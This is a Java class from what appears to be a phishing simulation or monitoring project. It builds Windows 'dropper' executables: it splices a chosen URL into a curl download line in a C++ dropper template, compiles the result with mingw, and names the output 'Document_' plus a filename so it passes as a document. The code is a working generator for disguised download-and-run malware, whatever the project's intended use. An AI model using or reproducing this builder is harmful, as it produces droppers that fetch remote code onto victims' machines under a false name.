package com.galimimus.phishingmonitor.helpers;

import com.galimimus.phishingmonitor.StartApplication;

import javax.activation.FileDataSource;
import java.io.*;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Scanner;
import java.util.concurrent.Executors;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static com.galimimus.phishingmonitor.helpers.Validation.createToken;

public class EXEGenerator {
    static final Logger log = Logger.getLogger(StartApplication.class.getName());

    public void EXE_gen(String filename, String url){
        System.out.println("EXE_GEN started");
        StringBuilder text = new StringBuilder();
        Pattern pattern = Pattern.compile("URL_DOWNLOAD = \"curl ");
        Scanner scanner = null;
        try {
            Path DropperSourcePath = Paths.get("dropper_files/dropper_original.cpp");
            scanner = new Scanner(new File("/home/galimimus/IdeaProjects/phishingMonitor/dropper_files/dropper-original.cpp"));
        } catch (IOException e) {
            log.logp(Level.SEVERE, "EXEGenerator", "EXE_gen", e.toString());
            throw new RuntimeException(e);
        }
        String tmp = "";
        Matcher matcher = pattern.matcher("");
        while (scanner.hasNextLine()) {
            tmp = scanner.nextLine();
            System.out.println(tmp);
            matcher.reset(tmp);
            while(matcher.find()){
                StringBuilder sb = new StringBuilder(tmp);
                sb.insert(matcher.end(), url);
                tmp = String.valueOf(sb);
            }
            text.append(tmp).append("\n");
        }
        scanner.close();
        PrintWriter writer = null;
        Path DropperGeneratedPath = Paths.get("dropper_files/dropper_outs/dropper.cpp");
        try {
            writer = new PrintWriter(DropperGeneratedPath.toString());
        } catch (IOException e) {
            log.logp(Level.SEVERE, "EXEGenerator", "EXE_gen", e.toString());
            throw new RuntimeException(e);
        }
        writer.print(text);
        writer.close();
        try {
            String command = "x86_64-w64-mingw32-g++ "+
                    DropperGeneratedPath.toAbsolutePath().normalize() +" -o "
                    +Paths.get("files").toAbsolutePath().normalize()+"/Document_"+filename;
            System.out.println(command);
            readData(Runtime.getRuntime().exec(command));

        } catch (IOException e) {
            log.logp(Level.SEVERE, "EXEGenerator", "EXE_gen", e.toString());
            throw new RuntimeException(e);
        }

    }
    private void readData(Process run) {
        String line;

        BufferedReader inputReader = new BufferedReader(new InputStreamReader(run.getInputStream()));
        BufferedReader outputReader = new BufferedReader(new InputStreamReader(run.getErrorStream()));
        try {
            while ((line = inputReader.readLine()) != null) {
                System.out.println(line);
            }
            inputReader.close();
            while ((line = outputReader.readLine()) != null) {
                System.out.println(line);
            }
            outputReader.close();
            run.waitFor();
        } catch (IOException | InterruptedException e) {
            throw new RuntimeException(e);
        }
    }
}
